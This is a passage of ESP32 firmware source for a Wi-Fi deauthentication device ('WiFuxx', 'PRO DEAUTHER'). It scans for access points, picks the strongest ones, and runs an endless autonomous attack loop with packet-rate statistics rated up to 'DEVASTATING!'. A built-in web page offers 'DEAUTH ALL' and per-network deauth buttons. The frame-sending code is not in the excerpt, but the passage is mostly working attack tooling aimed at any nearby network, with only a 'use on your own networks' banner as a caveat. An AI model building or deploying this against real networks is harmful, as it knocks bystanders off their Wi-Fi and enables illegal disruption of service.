                         pkt_24, (float)pkt_24 / elapsed_safe, targets_24.count);

            if (targets_5.count > 0)
                ESP_LOGI(TAG, "  5GHz:   %6lu pkt (%4.0f pps) - %d targets",
                         pkt_5, (float)pkt_5 / elapsed_safe, targets_5.count);

            if (display_mutex) {
                xSemaphoreTake(display_mutex, portMAX_DELAY);
                current_display_info.ap_count_24 = targets_24.count;
                current_display_info.ap_count_5  = targets_5.count;
                snprintf(current_display_info.status, sizeof(current_display_info.status),
                         "ATK %lus", elapsed);
                xSemaphoreGive(display_mutex);
            }
        }
    }

    // Final statistics
    uint32_t total_time = get_time_sec() - attack_start_time;
    uint32_t pkt_24 = 0, pkt_5 = 0;
    for (int i = 0; i < targets_24.count; i++) pkt_24 += targets_24.targets[i].packets_sent;
    for (int i = 0; i < targets_5.count;  i++) pkt_5  += targets_5.targets[i].packets_sent;

    uint32_t total      = pkt_24 + pkt_5;
    uint32_t time_safe  = total_time > 0 ? total_time : 1;
    float    avg_pps    = (float)total / time_safe;

    const char *rating = avg_pps > 1000 ? "DEVASTATING!" :
                         avg_pps > 700  ? "EXCELLENT"    :
                         avg_pps > 400  ? "GOOD"         : "MODERATE";

    ESP_LOGI(TAG, "╔════════════════════════════════════════╗");
    ESP_LOGI(TAG, "║            ATTACK COMPLETED            ║");
    ESP_LOGI(TAG, "╚════════════════════════════════════════╝");
    ESP_LOGI(TAG, "Total packets : %lu", total);
    ESP_LOGI(TAG, "Total time    : %lu seconds", total_time);
    ESP_LOGI(TAG, "Average PPS   : %.0f", avg_pps);
    ESP_LOGI(TAG, "2.4GHz        : %lu pkt (%.0f pps) across %d targets",
             pkt_24, (float)pkt_24 / time_safe, targets_24.count);
    ESP_LOGI(TAG, "5GHz          : %lu pkt (%.0f pps) across %d targets",
             pkt_5,  (float)pkt_5  / time_safe, targets_5.count);
    ESP_LOGI(TAG, "Effectiveness : %s", rating);

    attack_running = false;

    if (display_mutex) {
        xSemaphoreTake(display_mutex, portMAX_DELAY);
        strcpy(current_display_info.status, "IDLE");
        xSemaphoreGive(display_mutex);
    }

    attack_task_handle = NULL;
    vTaskDelete(NULL);
}

static bool start_multi_band_attack(void) {
    if (attack_running) {
        ESP_LOGW(TAG, "Attack already running");
        return false;
    }
    if (auto_targets.count == 0) {
        ESP_LOGW(TAG, "No targets selected");
        return false;
    }
    attack_running = true;
    if (xTaskCreate(multi_band_attack_task, "multi_band_attack", 8192,
                    NULL, 5, &attack_task_handle) != pdPASS) {
        ESP_LOGE(TAG, "Failed to create attack task");
        attack_running = false;
        return false;
    }
    return true;
}

// ==================== Scan and Filter ====================
// Sort scan results strongest-first so the limited MAX_TARGETS slots always go to
// the loudest APs rather than whatever order the driver returned them in.
static int cmp_ap_rssi_desc(const void *a, const void *b) {
    int ra = ((const wifi_ap_record_t *)a)->rssi;
    int rb = ((const wifi_ap_record_t *)b)->rssi;
    return (rb > ra) - (rb < ra);
}

static uint16_t scan_and_filter_targets(void) {
    wifi_scan_config_t scan_config = {
        .ssid        = 0,
        .bssid       = 0,
        .channel     = 0,
        .show_hidden = true,
    };

    led_state = LED_STATE_SCANNING;
    ESP_LOGI(TAG, "Scanning for networks...");
    if (esp_wifi_scan_start(&scan_config, true) != ESP_OK) {
        ESP_LOGE(TAG, "Scan failed");
        return 0;
    }

    uint16_t ap_num = 0;
    esp_wifi_scan_get_ap_num(&ap_num);
    ESP_LOGI(TAG, "Found %d total networks", ap_num);
    if (ap_num == 0) return 0;

    wifi_ap_record_t *ap_info = calloc(ap_num, sizeof(wifi_ap_record_t));
    if (!ap_info) return 0;
    esp_wifi_scan_get_ap_records(&ap_num, ap_info);

    // Strongest-first: the MAX_TARGETS cap then takes the loudest APs above threshold.
    qsort(ap_info, ap_num, sizeof(wifi_ap_record_t), cmp_ap_rssi_desc);

    auto_targets.count = 0;
    memset(&auto_targets.targets, 0, sizeof(auto_targets.targets));

    uint8_t count_24 = 0, count_5 = 0;

    for (int i = 0; i < ap_num && auto_targets.count < MAX_TARGETS; i++) {
        int threshold = (ap_info[i].primary <= 14)
                        ? g_settings.thr_24
                        : g_settings.thr_5;

        if (ap_info[i].rssi <= threshold) continue;

        attack_target_t *t = &auto_targets.targets[auto_targets.count];
        memcpy(t->bssid, ap_info[i].bssid, 6);

        if (strlen((char *)ap_info[i].ssid) == 0) {
            strcpy(t->ssid, "Hidden");
        } else {
            strncpy(t->ssid, (char *)ap_info[i].ssid, sizeof(t->ssid) - 1);
            t->ssid[sizeof(t->ssid) - 1] = '\0';
        }

        t->channel      = ap_info[i].primary;
        t->active       = true;
        t->packets_sent = 0;
        t->rssi         = ap_info[i].rssi;

        const char *band = (t->channel <= 14) ? "2.4GHz" : "5GHz";
        if (t->channel <= 14) count_24++; else count_5++;

        ESP_LOGI(TAG, "  [%d] %s (CH %d, %s, RSSI %d, MAC %02x:%02x:%02x:%02x:%02x:%02x)",
                 auto_targets.count, t->ssid, t->channel, band, t->rssi,
                 t->bssid[0], t->bssid[1], t->bssid[2],
                 t->bssid[3], t->bssid[4], t->bssid[5]);

        auto_targets.count++;
    }

    free(ap_info);
    ESP_LOGI(TAG, "Selected %d targets (%d on 2.4GHz, %d on 5GHz)",
             auto_targets.count, count_24, count_5);

    // Update display info
    display_info_t disp = {
        .ap_count_24 = count_24,
        .ap_count_5  = count_5,
        .ssid_count  = (auto_targets.count > 8) ? 8 : (uint8_t)auto_targets.count,
    };
    strcpy(disp.status, "SCAN");
    for (int i = 0; i < disp.ssid_count; i++) {
        strncpy(disp.ssid_list[i], auto_targets.targets[i].ssid, 31);
        disp.ssid_list[i][31] = '\0';
    }

    if (display_mutex) {
        xSemaphoreTake(display_mutex, portMAX_DELAY);
        memcpy(&current_display_info, &disp, sizeof(display_info_t));
        xSemaphoreGive(display_mutex);
    }

    return auto_targets.count;
}

// Fresh scan that IGNORES the RSSI thresholds and arms only the WebUI-selected
// target(s): SEL_MODE_SINGLE keeps the one BSSID g_sel_mac; SEL_MODE_DUALBAND keeps
// every BSSID broadcasting g_sel_ssid (both bands). A manual pick beats the
// threshold, by design. Returns the number of targets armed.
static uint16_t scan_selected_targets(void) {
    wifi_scan_config_t scan_config = {
        .ssid        = 0,
        .bssid       = 0,
        .channel     = 0,
        .show_hidden = true,
    };

    led_state = LED_STATE_SCANNING;
    ESP_LOGI(TAG, "Scanning for WebUI-selected target(s)...");
    if (esp_wifi_scan_start(&scan_config, true) != ESP_OK) {
        ESP_LOGE(TAG, "Scan failed");
        return 0;
    }

    uint16_t ap_num = 0;
    esp_wifi_scan_get_ap_num(&ap_num);
    if (ap_num == 0) return 0;

    wifi_ap_record_t *ap_info = calloc(ap_num, sizeof(wifi_ap_record_t));
    if (!ap_info) return 0;
    esp_wifi_scan_get_ap_records(&ap_num, ap_info);

    auto_targets.count = 0;
    memset(&auto_targets.targets, 0, sizeof(auto_targets.targets));
    uint8_t count_24 = 0, count_5 = 0;

    for (int i = 0; i < ap_num && auto_targets.count < MAX_TARGETS; i++) {
        wifi_ap_record_t *ap = &ap_info[i];

        bool match = (g_sel_mode == SEL_MODE_SINGLE)
                     ? (memcmp(ap->bssid, g_sel_mac, 6) == 0)
                     : (g_sel_ssid[0] != '\0' &&
                        strncmp((char *)ap->ssid, g_sel_ssid, 32) == 0);
        if (!match) continue;

        attack_target_t *t = &auto_targets.targets[auto_targets.count];
        memcpy(t->bssid, ap->bssid, 6);
        if (strlen((char *)ap->ssid) == 0) {
            strcpy(t->ssid, "Hidden");
        } else {
            strncpy(t->ssid, (char *)ap->ssid, sizeof(t->ssid) - 1);
            t->ssid[sizeof(t->ssid) - 1] = '\0';
        }
        t->channel      = ap->primary;
        t->active       = true;
        t->packets_sent = 0;
        t->rssi         = ap->rssi;
        if (t->channel <= 14) count_24++; else count_5++;

        ESP_LOGI(TAG, "  armed %s (CH %d, RSSI %d)", t->ssid, t->channel, t->rssi);
        auto_targets.count++;
    }
    free(ap_info);

    ESP_LOGI(TAG, "WebUI selection armed %d target(s) (%d on 2.4G, %d on 5G)",
             auto_targets.count, count_24, count_5);

    display_info_t disp = {
        .ap_count_24 = count_24,
        .ap_count_5  = count_5,
        .ssid_count  = (auto_targets.count > 8) ? 8 : (uint8_t)auto_targets.count,
    };
    strcpy(disp.status, "SCAN");
    for (int i = 0; i < disp.ssid_count; i++) {
        strncpy(disp.ssid_list[i], auto_targets.targets[i].ssid, 31);
        disp.ssid_list[i][31] = '\0';
    }
    if (display_mutex) {
        xSemaphoreTake(display_mutex, portMAX_DELAY);
        memcpy(&current_display_info, &disp, sizeof(display_info_t));
        xSemaphoreGive(display_mutex);
    }

    return auto_targets.count;
}

// ==================== Autonomous Mode Task ====================
static void autonomous_mode_task(void *pvParameters) {
    ESP_LOGI(TAG, "╔════════════════════════════════════════╗");
    ESP_LOGI(TAG, "║          PRO DEAUTH PEN TEST           ║");
    ESP_LOGI(TAG, "║        AUTONOMOUS MODE ACTIVE          ║");
    ESP_LOGI(TAG, "╚════════════════════════════════════════╝");
    ESP_LOGI(TAG, "2.4GHz threshold : > %d dBm", g_settings.thr_24);
    ESP_LOGI(TAG, "5GHz threshold   : > %d dBm", g_settings.thr_5);
    ESP_LOGI(TAG, "Max targets      : %d", MAX_TARGETS);
    ESP_LOGI(TAG, "Scan interval    : %d s (when no targets found)", AUTO_SCAN_INTERVAL_SEC);
    ESP_LOGI(TAG, "Attack duration  : INFINITE");

    if (display_mutex) {
        xSemaphoreTake(display_mutex, portMAX_DELAY);
        strcpy(current_display_info.status, "IDLE");
        xSemaphoreGive(display_mutex);
    }

    while (1) {
        // A WebUI selection (single/dualband) arms specific BSSIDs ignoring the
        // RSSI threshold; otherwise fall back to the autonomous threshold scan.
        uint16_t target_count =
            (g_sel_mode == SEL_MODE_SINGLE || g_sel_mode == SEL_MODE_DUALBAND)
                ? scan_selected_targets()
                : scan_and_filter_targets();

        if (target_count > 0) {
            led_state = LED_STATE_TARGETS_FOUND;
            ESP_LOGI(TAG, "Starting infinite attack on %d targets", target_count);
            vTaskDelay(pdMS_TO_TICKS(500));  // brief green flash so user sees the lock-on
            start_multi_band_attack();
            led_state = LED_STATE_ATTACKING;
            while (attack_running) vTaskDelay(pdMS_TO_TICKS(1000));
        } else {
            led_state = LED_STATE_NO_TARGETS;
            ESP_LOGI(TAG, "No strong signals, sleeping %ds...", AUTO_SCAN_INTERVAL_SEC);
        }

        ESP_LOGI(TAG, "Waiting %ds before next scan...", AUTO_SCAN_INTERVAL_SEC);
        vTaskDelay(pdMS_TO_TICKS(AUTO_SCAN_INTERVAL_SEC * 1000));
    }
}

// ==================== Display Task ====================
static void display_task(void *pvParameters) {
    display_info_t info;
    char line_buf[17];
    uint8_t scroll_index  = 0;
    const int max_ssid_lines = 5;

    if (!g_webui_display && !g_settings.skip_splash) oled_display_text_intro();

    while (1) {
        // WebUI factory-reset confirmation (10s BOOT hold) — shown before reboot.
        if (g_webui_resetting) {
            for (int p = 0; p < 8; p++) oled_clear_page(p);
            oled_draw_string(0, 1, ">> FACTORY RESET");
            oled_draw_string(0, 3, "Settings wiped");
            oled_draw_string(0, 4, "to defaults.");
            oled_draw_string(0, 6, "Restarting...");
            oled_flush();
            vTaskDelay(pdMS_TO_TICKS(200));
            continue;
        }

        // WebUI mode: static "connect to" screen, per the v2 spec.
        if (g_webui_display) {
            for (int p = 0; p < 8; p++) oled_clear_page(p);
            oled_draw_string(0, 0, ">> WiFuxx WebUI");
            oled_draw_string(0, 2, "Connect to:");
            oled_draw_string(0, 3, g_settings.ap_ssid);
            oled_draw_string(0, 5, "http://");
            oled_draw_string(0, 6, WEBUI_AP_IP);
            oled_draw_string(0, 7, "or " WEBUI_MDNS_HOST ".local");
            oled_flush();
            vTaskDelay(pdMS_TO_TICKS(1000));
            continue;
        }

        if (display_mutex) {
            xSemaphoreTake(display_mutex, portMAX_DELAY);
            memcpy(&info, &current_display_info, sizeof(display_info_t));
            xSemaphoreGive(display_mutex);
        }

        oled_clear_page(0);
        oled_draw_string(0, 0, ">> PRO DEAUTHER");

        oled_clear_page(1);
        snprintf(line_buf, sizeof(line_buf), "2.4G:%d 5G:%d", info.ap_count_24, info.ap_count_5);
        oled_draw_string(0, 1, line_buf);

        oled_clear_page(2);
        oled_draw_string(0, 2, info.status);

        for (int row = 3; row <= 7; row++) oled_clear_page(row);

        if (info.ssid_count > 0) {
            int start = 0;
            if (info.ssid_count > max_ssid_lines) {
                scroll_index = (scroll_index + 1) % info.ssid_count;
                start = scroll_index;
            } else {
                scroll_index = 0;
            }

            for (int i = 0; i < max_ssid_lines && (start + i) < info.ssid_count; i++) {
                strncpy(line_buf, info.ssid_list[start + i], 16);
                line_buf[16] = '\0';
                oled_draw_string(0, 3 + i, line_buf);
            }
        }

        oled_flush();  // single batch flush for all dirty pages
        vTaskDelay(pdMS_TO_TICKS(1000));
    }
}

// ==================== Wi-Fi Initialisation ====================
static void wifi_init_sta(void) {
    led_state = LED_STATE_WIFI_INIT;
    esp_netif_init();
    esp_event_loop_create_default();
    esp_netif_create_default_wifi_sta();

    wifi_init_config_t cfg = WIFI_INIT_CONFIG_DEFAULT();
    esp_wifi_init(&cfg);
    esp_wifi_set_mode(WIFI_MODE_STA);
    esp_wifi_start();

    esp_err_t ret = esp_wifi_set_promiscuous(true);
    if (ret != ESP_OK)
        ESP_LOGE(TAG, "Failed to enable promiscuous mode: %s", esp_err_to_name(ret));

    ESP_LOGI(TAG, "╔════════════════════════════════════════╗");
    ESP_LOGI(TAG, "║          PRO DEAUTH PEN TEST           ║");
    ESP_LOGI(TAG, "║      OPTIMISED DUAL-BAND DEAUTHER      ║");
    ESP_LOGI(TAG, "╚════════════════════════════════════════╝");
    ESP_LOGI(TAG, "Wi-Fi STA + promiscuous enabled");
    ESP_LOGI(TAG, "2.4GHz burst: %d | 5GHz burst: %d", g_settings.burst_24, g_settings.burst_5);
    ESP_LOGI(TAG, "USE ONLY ON YOUR OWN NETWORKS!");
}

// ==================== WebUI: Embedded Page ====================
// Single self-contained page. HTML/CSS use single quotes and the JS uses
// backticks, so the whole document contains no double-quote characters and embeds
// in this C string literal without escaping. Dark theme adapted from the parked
// `webui` branch; reworked from WebSocket to plain fetch + the v2 REST endpoints.
static const char WEBUI_HTML[] =
"<!DOCTYPE html><html lang='en'><head>\n"
"<meta charset='UTF-8'>\n"
"<meta name='viewport' content='width=device-width, initial-scale=1.0, maximum-scale=1.0'>\n"
"<title>WiFuxx Control</title>\n"
"<link rel='icon' type='image/x-icon' href='/favicon.ico'>\n"
"<style>\n"
// gallusgadgets.com brand palette. Legacy var names kept to avoid churning every
// reference: --yellow is now warm body text, --cyan is the burnt-orange alt-brand
// accent, --orange is brand orange, --red is kept for destructive actions only.
":root{--bg:#15151B;--mid:#15151B;--card:#1C1C24;--border:#2C2C35;--yellow:#C8C3BB;--orange:#E8900A;--cyan:#C45C12;--muted:#8C857B;--red:#FF4444;}\n"
"*{box-sizing:border-box;margin:0;padding:0;}\n"
"body{font-family:-apple-system,BlinkMacSystemFont,'Segoe UI',sans-serif;background:var(--bg);color:var(--yellow);min-height:100vh;padding-bottom:2rem;}\n"
"header{background:var(--bg);padding:1rem 1.25rem;border-bottom:2px solid var(--orange);position:sticky;top:0;z-index:10;}\n"
"header h1{color:var(--orange);font-size:1.6rem;letter-spacing:.05em;}\n"
"header p{color:var(--muted);font-size:.7rem;letter-spacing:.1em;text-transform:uppercase;margin-top:.2rem;}\n"
"main{max-width:540px;margin:0 auto;padding:1rem .75rem;display:flex;flex-direction:column;gap:1rem;}\n"
".card{background:var(--card);border-radius:10px;padding:1rem 1.25rem;border:1px solid var(--border);}\n"
".card h2{color:var(--orange);font-size:.85rem;letter-spacing:.1em;text-transform:uppercase;margin-bottom:.9rem;}\n"
".btn{display:block;width:100%;padding:.75rem 1rem;border-radius:7px;font-size:.95rem;font-weight:700;letter-spacing:.06em;cursor:pointer;border:2px solid transparent;background:var(--mid);color:var(--yellow);}\n"
".btn:active{transform:scale(.98);}\n"
".btn:disabled{opacity:.4;}\n"
".btn-orange{background:var(--orange);color:var(--bg);border-color:var(--orange);}\n"
".btn-cyan{background:transparent;color:var(--cyan);border-color:var(--cyan);}\n"
".scan-row{display:flex;gap:.75rem;align-items:center;}\n"
".scan-row .btn{width:auto;padding:.6rem 1.2rem;flex-shrink:0;}\n"
"#scanmsg{font-size:.8rem;color:var(--muted);}\n"
"#netlist{display:flex;flex-direction:column;gap:.6rem;}\n"
".net{background:var(--mid);border-radius:8px;border:1px solid var(--border);overflow:hidden;}\n"
".net-head{display:flex;align-items:center;gap:.5rem;padding:.6rem .9rem;}\n"
".net-ssid{flex:1;color:var(--yellow);font-weight:600;font-size:.9rem;overflow:hidden;text-overflow:ellipsis;white-space:nowrap;}\n"
".badge{font-size:.65rem;font-weight:700;padding:.15rem .4rem;border-radius:4px;}\n"
".b24{background:rgba(196,92,18,.15);color:var(--cyan);border:1px solid var(--cyan);}\n"
".b5{background:rgba(232,144,10,.15);color:var(--orange);border:1px solid var(--orange);}\n"
".dual{padding:0 .9rem .6rem;}\n"
".btn-dual{width:100%;padding:.45rem;font-size:.72rem;font-weight:700;border-radius:5px;border:1px solid var(--orange);background:transparent;color:var(--orange);cursor:pointer;}\n"
".bssid{display:flex;align-items:center;gap:.5rem;padding:.45rem .9rem;font-size:.75rem;border-top:1px solid rgba(255,255,255,.05);}\n"
".mac{color:var(--muted);font-family:monospace;flex:1;}\n"
".ch{color:var(--yellow);}\n"
".rssi{color:var(--muted);}\n"
".btn-sm{padding:.3rem .6rem;font-size:.7rem;font-weight:700;border-radius:5px;border:1px solid var(--red);background:transparent;color:var(--red);cursor:pointer;flex-shrink:0;}\n"
".empty{color:var(--muted);font-size:.85rem;text-align:center;padding:.5rem 0;}\n"
"#toast{position:fixed;left:50%;bottom:1.2rem;transform:translateX(-50%);background:var(--card);border:1px solid var(--orange);color:var(--yellow);padding:.7rem 1rem;border-radius:8px;font-size:.8rem;max-width:90%;text-align:center;display:none;z-index:20;}\n"
".spin{display:inline-block;width:14px;height:14px;border:2px solid var(--mid);border-top-color:var(--cyan);border-radius:50%;animation:s .7s linear infinite;vertical-align:middle;margin-right:6px;}\n"
"@keyframes s{to{transform:rotate(360deg);}}\n"
"footer{text-align:center;color:var(--muted);font-family:monospace;font-size:.7rem;letter-spacing:.05em;padding:1.25rem .75rem 0;}\n"
"footer .gg{color:var(--orange);}\n"
"label{display:block;font-size:.75rem;color:var(--muted);margin-bottom:.7rem;letter-spacing:.03em;}\n"
"label input{display:block;width:100%;margin-top:.3rem;padding:.5rem .6rem;background:var(--mid);border:1px solid var(--border);border-radius:6px;color:var(--yellow);font-size:.9rem;}\n"
".chk{display:flex;align-items:center;gap:.5rem;margin:.2rem 0 1rem;}\n"
".chk input{width:auto;margin:0;}\n"
"#cfgsave{margin-top:.2rem;}\n"
"#cfgreset{margin-top:.6rem;}\n"
"</style></head><body>\n"
"<header><h1>WiFuxx</h1><p>// by Gallus Gadgets</p></header>\n"
"<main>\n"
"<div class='card'><h2>Scan</h2><div class='scan-row'><button class='btn btn-cyan' id='scan'>SCAN</button><span id='scanmsg'>Tap SCAN to discover networks.</span></div></div>\n"
"<div class='card'><h2>Attack</h2><button class='btn btn-orange' id='all'>DEAUTH ALL</button></div>\n"
"<div class='card'><h2>Networks</h2><div id='netlist'><p class='empty'>No scan yet.</p></div></div>\n"
"<div class='card'><h2>Power</h2><button class='btn btn-cyan' id='charge'>CHARGE MODE</button></div>\n"
"<div class='card'><h2>Settings</h2>\n"
"<label>AP SSID<input id='ap_ssid' maxlength='32'></label>\n"
"<label>AP channel (1-13)<input id='ap_channel' type='number' min='1' max='13'></label>\n"
"<label>2.4G threshold dBm (-95..-30)<input id='thr_24' type='number' min='-95' max='-30'></label>\n"
"<label>5G threshold dBm (-95..-30)<input id='thr_5' type='number' min='-95' max='-30'></label>\n"
"<label>2.4G burst (1-200)<input id='burst_24' type='number' min='1' max='200'></label>\n"
"<label>5G burst (1-200)<input id='burst_5' type='number' min='1' max='200'></label>\n"
"<label>WebUI user<input id='ui_user' maxlength='16' placeholder='blank = no login'></label>\n"
"<label>WebUI pass<input id='ui_pass' type='password' maxlength='32' placeholder='unchanged'></label>\n"
"<label class='chk'><input id='skip_splash' type='checkbox'> Skip boot splash</label>\n"
"<button class='btn btn-orange' id='cfgsave'>SAVE SETTINGS</button>\n"
"<button class='btn btn-cyan' id='cfgreset'>RESET TO DEFAULTS</button>\n"
"</div>\n"
"</main>\n"
"<footer>&gt;_ <span class='gg'>Gallus Gadgets</span> // hack your own</footer>\n"
"<div id='toast'></div>\n"
"<script>\n"
"const listEl=document.getElementById('netlist');\n"
"const msgEl=document.getElementById('scanmsg');\n"
"const scanBtn=document.getElementById('scan');\n"
"const toastEl=document.getElementById('toast');\n"
"const esc=s=>String(s).replace(/&/g,'&amp;').replace(/</g,'&lt;').replace(/>/g,'&gt;').replace(/'/g,'&#39;');\n"
"const toast=t=>{toastEl.textContent=t;toastEl.style.display='block';};\n"
"function group(nets){const m={};for(const n of nets){(m[n.ssid]=m[n.ssid]||[]).push(n);}return m;}\n"
"function render(nets){\n"
"  if(!nets.length){listEl.innerHTML=`<p class='empty'>No networks found.</p>`;return;}\n"
"  const g=group(nets);let html='';\n"
"  for(const ssid in g){\n"
"    const aps=g[ssid];\n"
"    const has24=aps.some(a=>a.band==='2.4');\n"
"    const has5=aps.some(a=>a.band==='5');\n"
"    html+=`<div class='net'><div class='net-head'><span class='net-ssid'>${esc(ssid)}</span>`;\n"
"    if(has24)html+=`<span class='badge b24'>2.4G</span>`;\n"
"    if(has5)html+=`<span class='badge b5'>5G</span>`;\n"
"    html+=`</div>`;\n"
"    if(has24&&has5)html+=`<div class='dual'><button class='btn-dual' data-ssid='${esc(ssid)}'>DUAL-BAND SAME AP</button></div>`;\n"
"    for(const a of aps){\n"
"      html+=`<div class='bssid'><span class='mac'>${a.mac}</span><span class='ch'>CH${a.channel}</span><span class='badge ${a.band==='5'?'b5':'b24'}'>${a.band}G</span><span class='rssi'>${a.rssi}</span><button class='btn-sm' data-mac='${a.mac}'>DEAUTH</button></div>`;\n"
"    }\n"
"    html+=`</div>`;\n"
"  }\n"
"  listEl.innerHTML=html;\n"
"}\n"
"scanBtn.onclick=()=>{\n"
"  scanBtn.disabled=true;msgEl.innerHTML=`<span class='spin'></span>Scanning`;\n"
"  fetch('/scan').then(r=>r.json()).then(d=>{render(d);msgEl.textContent=`${d.length} network${d.length===1?'':'s'} found`;})\n"
"  .catch(()=>{msgEl.textContent='Scan failed';}).then(()=>{scanBtn.disabled=false;});\n"
"};\n"
"function attack(body){\n"
"  toast('Command sent. Device is leaving WebUI to attack. Hold BOOT 2s to return.');\n"
"  fetch('/attack',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify(body)}).catch(()=>{});\n"
"}\n"
"document.getElementById('all').onclick=()=>attack({mode:'all'});\n"
"listEl.onclick=e=>{\n"
"  const t=e.target;\n"
"  if(t.dataset.mac)attack({mode:'single',mac:t.dataset.mac});\n"
"  else if(t.dataset.ssid)attack({mode:'dualband',ssid:t.dataset.ssid});\n"
"};\n"
"document.getElementById('charge').onclick=()=>{\n"
"  if(!confirm('Enter Charge Mode? Wi-Fi turns off and the unit charges quietly. Unplug when the XIAO charge LED goes out; use the power switch to run it again.'))return;\n"
"  toast('Charge mode \\u2014 Wi-Fi off. Unplug when the XIAO C LED goes out.');\n"
"  fetch('/charge',{method:'POST'}).catch(()=>{});\n"
"};\n"
"const $=id=>document.getElementById(id);\n"
"function loadCfg(){fetch('/config').then(r=>r.json()).then(c=>{\n"
"  $('ap_ssid').value=c.ap_ssid;$('ap_channel').value=c.ap_channel;$('thr_24').value=c.thr_24;$('thr_5').value=c.thr_5;\n"
"  $('burst_24').value=c.burst_24;$('burst_5').value=c.burst_5;$('ui_user').value=c.ui_user;$('skip_splash').checked=c.skip_splash;\n"
"}).catch(()=>{});}\n"
"loadCfg();\n"
"$('cfgsave').onclick=()=>{\n"
"  const b={ap_ssid:$('ap_ssid').value,ap_channel:+$('ap_channel').value,thr_24:+$('thr_24').value,thr_5:+$('thr_5').value,\n"
"    burst_24:+$('burst_24').value,burst_5:+$('burst_5').value,ui_user:$('ui_user').value,skip_splash:$('skip_splash').checked};\n"
"  if($('ui_pass').value)b.ui_pass=$('ui_pass').value;\n"
"  fetch('/config',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify(b)})\n"
"    .then(r=>r.json()).then(d=>{toast(d.ok?'Saved. SSID/channel/login apply on next WebUI boot.':'Save failed');$('ui_pass').value='';})\n"
"    .catch(()=>toast('Save failed'));\n"
"};\n"
"$('cfgreset').onclick=()=>{\n"
"  if(!confirm('Reset all settings to defaults?'))return;\n"
"  fetch('/config/reset',{method:'POST'}).then(r=>r.json()).then(()=>{toast('Reset to defaults');loadCfg();}).catch(()=>toast('Reset failed'));\n"
"};\n"
"</script></body></html>";

// ==================== WebUI: Scan -> JSON ====================
// Fresh scan returning ALL nearby APs (no RSSI threshold) as the JSON array the
// WebUI list consumes: [{ssid,rssi,band,mac,channel}, ...]. Needs STA up, which
// WebUI mode provides via APSTA. Caller frees the result with cJSON_free().
static char *do_webui_scan_json(void) {
    wifi_scan_config_t scan_config = { .show_hidden = true };

    led_state = LED_STATE_SCANNING;
    esp_err_t err = esp_wifi_scan_start(&scan_config, true);
    led_state = LED_STATE_WEBUI_IDLE;
    if (err != ESP_OK) {
        ESP_LOGE(TAG, "WebUI scan failed: %s", esp_err_to_name(err));
        return NULL;
    }

    uint16_t ap_num = 0;
    esp_wifi_scan_get_ap_num(&ap_num);
    wifi_ap_record_t *ap_info = ap_num ? calloc(ap_num, sizeof(wifi_ap_record_t)) : NULL;
    if (ap_num && ap_info) esp_wifi_scan_get_ap_records(&ap_num, ap_info);

    cJSON *arr = cJSON_CreateArray();
    uint8_t count_24 = 0, count_5 = 0;

    for (int i = 0; i < ap_num && i < WEBUI_SCAN_MAX && ap_info; i++) {
        wifi_ap_record_t *ap = &ap_info[i];
        char mac[18];
        snprintf(mac, sizeof(mac), "%02x:%02x:%02x:%02x:%02x:%02x",
                 ap->bssid[0], ap->bssid[1], ap->bssid[2],
                 ap->bssid[3], ap->bssid[4], ap->bssid[5]);
        bool is5 = ap->primary > 14;
        if (is5) count_5++; else count_24++;

        cJSON *net = cJSON_CreateObject();
        const char *ssid = (strlen((char *)ap->ssid) == 0) ? "Hidden" : (char *)ap->ssid;
        cJSON_AddStringToObject(net, "ssid",    ssid);
        cJSON_AddNumberToObject(net, "rssi",    ap->rssi);
        cJSON_AddStringToObject(net, "band",    is5 ? "5" : "2.4");
        cJSON_AddStringToObject(net, "mac",     mac);
        cJSON_AddNumberToObject(net, "channel", ap->primary);
        cJSON_AddItemToArray(arr, net);
    }
    if (ap_info) free(ap_info);

    ESP_LOGI(TAG, "WebUI scan: %d APs (%d on 2.4G, %d on 5G)",
             count_24 + count_5, count_24, count_5);

    if (display_mutex) {
        xSemaphoreTake(display_mutex, portMAX_DELAY);
        current_display_info.ap_count_24 = count_24;
        current_display_info.ap_count_5  = count_5;
        xSemaphoreGive(display_mutex);
    }

    char *out = cJSON_PrintUnformatted(arr);
    cJSON_Delete(arr);
    return out;
}

// ==================== WebUI: HTTP Handlers ====================
// Optional HTTP Basic auth. When a username is configured, every handler checks
// this first; with no username the WebUI stays open (default). On failure it
// emits a 401 challenge and the caller should just `return ESP_OK`.
static bool webui_authorized(httpd_req_t *req) {
    const char *expected = settings_expected_auth();
    if (!expected) return true;   // auth disabled

    char got[96];
    if (httpd_req_get_hdr_value_str(req, "Authorization", got, sizeof(got)) == ESP_OK
        && strcmp(got, expected) == 0) {
        return true;
    }
    httpd_resp_set_status(req, "401 Unauthorized");
    httpd_resp_set_hdr(req, "WWW-Authenticate", "Basic realm=\"WiFuxx\"");
    httpd_resp_set_type(req, "text/plain");
    httpd_resp_sendstr(req, "Authentication required");
    return false;
}

static esp_err_t root_get_handler(httpd_req_t *req) {
    if (!webui_authorized(req)) return ESP_OK;
    httpd_resp_set_type(req, "text/html");
    return httpd_resp_send(req, WEBUI_HTML, HTTPD_RESP_USE_STRLEN);
}

// Served without the auth guard so the browser tab icon loads even at the login
// prompt. Cached aggressively since it's a fixed asset.
static esp_err_t favicon_get_handler(httpd_req_t *req) {
    httpd_resp_set_type(req, "image/x-icon");
    httpd_resp_set_hdr(req, "Cache-Control", "max-age=86400");
    return httpd_resp_send(req, (const char *)favicon_ico, sizeof(favicon_ico));
}

static esp_err_t scan_get_handler(httpd_req_t *req) {
    if (!webui_authorized(req)) return ESP_OK;
    char *json = do_webui_scan_json();
    if (!json) { httpd_resp_send_500(req); return ESP_FAIL; }
    httpd_resp_set_type(req, "application/json");
    httpd_resp_sendstr(req, json);
    cJSON_free(json);
    return ESP_OK;
}

static bool parse_mac(const char *s, uint8_t out[6]) {
    unsigned int b[6];
    if (sscanf(s, "%x:%x:%x:%x:%x:%x", &b[0], &b[1], &b[2], &b[3], &b[4], &b[5]) != 6)
        return false;
    for (int i = 0; i < 6; i++) out[i] = (uint8_t)b[i];
    return true;
}

// POST /attack — store the chosen target selection in RTC and reboot into ATTACK.
// Body: {"mode":"all"} | {"mode":"single","mac":".."} | {"mode":"dualband","ssid":".."}
static esp_err_t attack_post_handler(httpd_req_t *req) {
    if (!webui_authorized(req)) return ESP_OK;
    char buf[256];
    int n = httpd_req_recv(req, buf, sizeof(buf) - 1);
    if (n <= 0) { httpd_resp_send_err(req, HTTPD_400_BAD_REQUEST, NULL); return ESP_FAIL; }
    buf[n] = '\0';

    cJSON *json = cJSON_Parse(buf);
